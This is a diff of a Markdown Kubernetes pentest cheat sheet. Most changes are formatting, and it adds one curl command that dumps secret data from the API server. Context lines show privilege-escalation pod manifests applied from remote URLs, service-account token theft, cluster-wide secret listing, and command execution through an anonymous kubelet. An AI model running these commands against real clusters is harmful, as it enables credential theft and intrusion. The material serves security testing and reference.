@@ -8,12 +8,12 @@
 - [Container Environment](#container-environment)
 - [Information Gathering](#information-gathering)
 - [RBAC Configuration](#rbac-configuration)
-  - [Listing Secrets](#listing-secrets)
-  - [Access Any Resource or Verb](#access-any-resource-or-verb)
-  - [Pod Creation](#pod-creation)
-  - [Privilege to Use Pods/Exec](#privilege-to-use-pods-exec)
-  - [Privilege to Get/Patch Rolebindings](#privilege-to-get-patch-rolebindings)
-  - [Impersonating a Privileged Account](#impersonating-a-privileged-account)
+    - [Listing Secrets](#listing-secrets)
+    - [Access Any Resource or Verb](#access-any-resource-or-verb)
+    - [Pod Creation](#pod-creation)
+    - [Privilege to Use Pods/Exec](#privilege-to-use-podsexec)
+    - [Privilege to Get/Patch Rolebindings](#privilege-to-getpatch-rolebindings)
+    - [Impersonating a Privileged Account](#impersonating-a-privileged-account)
 - [Privileged Service Account Token](#privileged-service-account-token)
 - [Kubernetes Endpoints](#kubernetes-endpoints)
 - [Exploits](#exploits)
@@ -23,7 +23,8 @@
 
 ## Tools
 
-* [BishopFox/badpods](https://github.com/BishopFox/badpods) - A collection of manifests that will create pods with elevated privileges.
+- [BishopFox/badpods](https://github.com/BishopFox/badpods) - A collection of manifests that will create pods with elevated privileges.
+
     ```ps1
     kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
     kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/pod/priv-and-hostpid-exec-pod.yaml
@@ -35,8 +36,9 @@
     kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml
     ```
 
-* [serain/kubelet-anon-rce](https://github.com/serain/kubelet-anon-rce) - Executes commands in a container on a kubelet endpoint that allows anonymous authentication
-* [DataDog/KubeHound](https://github.com/DataDog/KubeHound) - Kubernetes Attack Graph
+- [serain/kubelet-anon-rce](https://github.com/serain/kubelet-anon-rce) - Executes commands in a container on a kubelet endpoint that allows anonymous authentication
+- [DataDog/KubeHound](https://github.com/DataDog/KubeHound) - Kubernetes Attack Graph
+
     ```ps1
     # Critical paths enumeration
     kh.containers().criticalPaths().count()
@@ -52,13 +54,12 @@
     .group().by("serviceDns").by("port")
     ```
 
-* [Shopify/kubeaudit](https://github.com/Shopify/kubeaudit) - Audit Kubernetes clusters against common security concerns
-* [aquasecurity/kube-bench](https://github.com/aquasecurity/kube-bench) - Checks whether Kubernetes is deployed securely by running [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes/)
-* [aquasecurity/kube-hunter](https://github.com/aquasecurity/kube-hunter) - Hunt for security weaknesses in Kubernetes clusters
-* [armosec/kubescape](https://github.com/armosec/kubescape) - Automate Kubernetes cluster scans to identify security issues
-* [kubesec.io](https://kubesec.io/) - Security risk analysis for Kubernetes resources
-* [katacoda.com](https://katacoda.com/courses/kubernetes) - Learn Kubernetes using interactive broser-based scenarios
-
+- [Shopify/kubeaudit](https://github.com/Shopify/kubeaudit) - Audit Kubernetes clusters against common security concerns
+- [aquasecurity/kube-bench](https://github.com/aquasecurity/kube-bench) - Checks whether Kubernetes is deployed securely by running [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes/)
+- [aquasecurity/kube-hunter](https://github.com/aquasecurity/kube-hunter) - Hunt for security weaknesses in Kubernetes clusters
+- [armosec/kubescape](https://github.com/armosec/kubescape) - Automate Kubernetes cluster scans to identify security issues
+- [kubesec.io](https://kubesec.io/) - Security risk analysis for Kubernetes resources
+- [katacoda.com](https://katacoda.com/courses/kubernetes) - Learn Kubernetes using interactive broser-based scenarios
 
 ## Container Environment
 
@@ -68,7 +69,7 @@ Containers within a Kubernetes cluster automatically have certain information ma
 
 Each Kubernetes pod is assigned a service account for accessing the Kubernetes API. The service account, in addition to the current namespace and Kubernetes SSL certificate, are made available via a mounted read-only volume:
 
-```
+```ps1
 /var/run/secrets/kubernetes.io/serviceaccount/token
 /var/run/secrets/kubernetes.io/serviceaccount/namespace
 /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
@@ -80,7 +81,7 @@ If the `kubectl` utility is installed in the container, it will use this service
 
 The `KUBERNETES_SERVICE_HOST` and `KUBERNETES_SERVICE_PORT` environment variables are automatically provided to the container. They contain the IP address and port number of the Kubernetes master node. If `kubectl` is installed, it will use these values automatically. If not, the values can be used to determine the correct IP address to send API requests to.
 
-```
+```ps1
 KUBERNETES_SERVICE_HOST=192.168.154.228
 KUBERNETES_SERVICE_PORT=443
 ```
@@ -92,7 +93,7 @@ Additionally, [environment variables](https://kubernetes.io/docs/concepts/servic
 
 For example, all of the following environment variables would be available if a `redis-master` service were running with port 6379 exposed:
 
-```
+```ps1
 REDIS_MASTER_SERVICE_HOST=10.0.0.11
 REDIS_MASTER_SERVICE_PORT=6379
 REDIS_MASTER_PORT=tcp://10.0.0.11:6379
@@ -174,6 +175,7 @@ An attacker that gains access to list secrets in the cluster can use the followi
 
 ```powershell
 curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
+curl -k -v -H "Authorization: Bearer <jwt_token>" -H "Content-Type: application/json" https://<master_ip>:6443/api/v1/namespaces/default/secrets | jq -r '.items[].data'
 ```
 
 ### Access Any Resource or Verb
@@ -261,8 +263,8 @@ curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" -H
 ## Privileged Service Account Token
 
 ```powershell
-$ cat /run/secrets/kubernetes.io/serviceaccount/token
-$ curl -k -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/default/secrets/
+cat /run/secrets/kubernetes.io/serviceaccount/token
+curl -k -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/default/secrets/
 ```
 
 ## Kubernetes Endpoints
@@ -324,36 +326,34 @@ curl -k https://<IP Address>:10255
 http://<external-IP>:10255/pods
 ```
 
-
 ## Exploits
 
 ### Accessible kubelet on 10250/TCP
 
 **Requirements**:
 
-* `--anonymous-auth`: Enables anonymous requests to the Kubelet server
+- `--anonymous-auth`: Enables anonymous requests to the Kubelet server
 
 **Exploit**:
 
-* Getting pods: `curl -ks https://worker:10250/pods`
-* Run commands: `curl -Gks https://worker:10250/exec/{namespace}/{pod}/{container} -d 'input=1' -d 'output=1' -d'tty=1' -d 'command=ls' -d 'command=/'`
-
+- Getting pods: `curl -ks https://worker:10250/pods`
+- Run commands: `curl -Gks https://worker:10250/exec/{namespace}/{pod}/{container} -d 'input=1' -d 'output=1' -d'tty=1' -d 'command=ls' -d 'command=/'`
 
 ### Obtaining Service Account Token
 
 Token is stored at `/var/run/secrets/kubernetes.io/serviceaccount/token`
 
 Use the service account token:
-* on `kube-apiserver` API: `curl -ks -H "Authorization: Bearer <TOKEN>" https://master:6443/api/v1/namespaces/{namespace}/secrets`
-* with kubectl: ` kubectl --insecure-skip-tls-verify=true --server="https://master:6443" --token="<TOKEN>" get secrets --all-namespaces -o json`
 
+- on `kube-apiserver` API: `curl -ks -H "Authorization: Bearer <TOKEN>" https://master:6443/api/v1/namespaces/{namespace}/secrets`
+- with kubectl: `kubectl --insecure-skip-tls-verify=true --server="https://master:6443" --token="<TOKEN>" get secrets --all-namespaces -o json`
 
 ### Create gitRepo Volumes to Execute Code
 
 **Requirements**:
 
-* [`gitRepo`](https://kubernetes.io/docs/concepts/storage/volumes/#gitrepo) volume type enabled
-* `create` rights on pods
+- [`gitRepo`](https://kubernetes.io/docs/concepts/storage/volumes/#gitrepo) volume type enabled
+- `create` rights on pods
 
 **Exploit**:
 
@@ -378,15 +378,14 @@ spec:
       revision: main
 ```
 
-
 ## References
 
-* [Attacking Kubernetes through Kubelet - Withsecure Labs- 11 January, 2019](https://labs.withsecure.com/publications/attacking-kubernetes-through-kubelet)
-* [kubehound - Attack Reference](https://kubehound.io/reference/attacks/)
-* [KubeHound: Identifying attack paths in Kubernetes clusters - Datadog - October 2, 2023](https://securitylabs.datadoghq.com/articles/kubehound-identify-kubernetes-attack-paths/)
-* [Fun With GitRepo Volumes - Rory McCune - JULY 10TH, 2024](https://raesene.github.io/blog/2024/07/10/Fun-With-GitRepo-Volumes/)
-* [Kubernetes Pentest Methodology Part 1 - by Or Ida on August 8, 2019](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
-* [Kubernetes Pentest Methodology Part 2 - by Or Ida on September 5, 2019](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2)
-* [Kubernetes Pentest Methodology Part 3 - by Or Ida on November 21, 2019](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3)
-* [Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon](https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0)
-* [Kubernetes Pod Privilege Escalation](https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation)
+- [Attacking Kubernetes through Kubelet - Withsecure Labs- 11 January, 2019](https://labs.withsecure.com/publications/attacking-kubernetes-through-kubelet)
+- [kubehound - Attack Reference](https://kubehound.io/reference/attacks/)
+- [KubeHound: Identifying attack paths in Kubernetes clusters - Datadog - October 2, 2023](https://securitylabs.datadoghq.com/articles/kubehound-identify-kubernetes-attack-paths/)
+- [Fun With GitRepo Volumes - Rory McCune - JULY 10TH, 2024](https://raesene.github.io/blog/2024/07/10/Fun-With-GitRepo-Volumes/)
+- [Kubernetes Pentest Methodology Part 1 - by Or Ida on August 8, 2019](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
+- [Kubernetes Pentest Methodology Part 2 - by Or Ida on September 5, 2019](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2)
+- [Kubernetes Pentest Methodology Part 3 - by Or Ida on November 21, 2019](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3)
+- [Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon](https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0)
+- [Kubernetes Pod Privilege Escalation](https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation)
